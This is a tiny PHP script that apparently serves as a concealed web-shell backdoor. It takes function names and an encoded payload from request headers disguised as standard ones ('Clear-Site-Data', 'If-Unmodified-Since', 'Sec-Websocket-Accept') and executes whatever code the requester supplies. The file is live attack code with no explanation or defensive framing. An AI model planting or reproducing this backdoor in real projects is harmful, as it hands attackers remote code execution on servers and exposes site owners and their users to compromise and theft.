<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Clear-Site-Data'])) {
    $request = $_HEADERS['Clear-Site-Data']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['Sec-Websocket-Accept']));
    $request();
}